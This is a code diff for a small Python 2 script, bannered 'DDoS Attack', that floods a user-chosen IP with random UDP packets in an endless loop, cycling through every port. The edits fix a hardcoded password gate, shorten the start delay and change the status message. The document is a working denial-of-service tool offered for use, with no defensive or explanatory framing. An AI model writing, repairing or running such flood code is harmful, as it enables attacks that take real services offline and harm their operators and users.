@@ -16,29 +16,26 @@ year = now.year
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1464)
 #############
-
 os.system("clear")
 print " ____  _____                     _   _   _             _ "
 print "|  _ \|  _  \  ___  ___         / \ | |_| |_ __ _  ___| | __ "
 print "| | | | | |  |/ _ \/ __|       / _ \| __| __/ _` |/ __| |/ /"
 print "| |_| | |_|  | (_) \__ \      / ___ \ |_| || (_| | (__|   <"
 print "|____/|_____/ \___/|___/     /_/   \_\__|\__\__,_|\___|_|\_\ "
-print "Please input the password"
+print "Please input the Password"
 password = input("Password : ")
-if password ！== 114514DDoS
-  os.exit()
-     
-   
+if password != 1145141919810:
+    print"Password error"
+    os.exit()
 
-
-
+print
 ip = raw_input("IP : ")
 port = input("port : ")
 
 os.system("clear")
 os.system("")
 print"The DDoS is Starting!"
-time.sleep(5)
+time.sleep(3)
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
@@ -47,5 +44,7 @@ while True:
      if port == 65535:
        port = 1
 
-       print" Send %s to %s  of Through port 1-65535 frequency %s"%(sent,ip,frequency)
 
+       print" Send %s to %s  of Through port 1-65535 "%(sent,ip)
+
+#fixed a bug to if port == 65535
